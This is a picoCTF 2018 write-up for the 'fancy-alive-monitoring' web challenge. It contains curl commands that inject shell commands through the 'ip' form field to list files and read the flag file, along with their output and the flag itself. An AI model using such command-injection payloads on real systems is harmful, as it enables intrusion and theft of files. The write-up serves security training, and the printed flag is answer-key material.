# fancy-alive-monitoring - Points: 400 - (Solves: 245)

One of my school mate developed an alive monitoring tool.
Can you get a flag from http://2018shell2.picoctf.com:17593 (link)?

## Hints

- This application uses the validation check both on the client side
  and on the server side, but the server check seems to be inappropriate.
- You should be able to listen through the shell on the server.

---

https://github.com/lucyoa/ctf-wiki/tree/master/web/command-injection

```sh
% curl -d 'ip=127.0.0.1 ; ls -l > /tmp/zzzz.html ;' http://2018shell2.picoctf.com:17593/index.php
% cat /tmp/zzzz.html
total 16
-rw-rw-r-- 1 hacksports hacksports               1197 Sep 28 07:46 index.php
-rw-rw-r-- 1 hacksports hacksports               1197 Sep 28 07:46 index.txt
-r--r----- 1 hacksports fancy-alive-monitoring_0   56 Sep 28 07:46 the-secret-1335-flag.txt
-rwxr-sr-x 1 hacksports fancy-alive-monitoring_0  346 Sep 28 07:46 xinet_startup.sh
% curl -d 'ip=127.0.0.1 ; cat the-secret-1335-flag.txt > /tmp/zzzz.html ;' http://2018shell2.picoctf.com:17593/index.php
% cat /tmp/zzzz.html
Here is your flag: picoCTF{n3v3r_trust_a_b0x_d7ad162d}
```
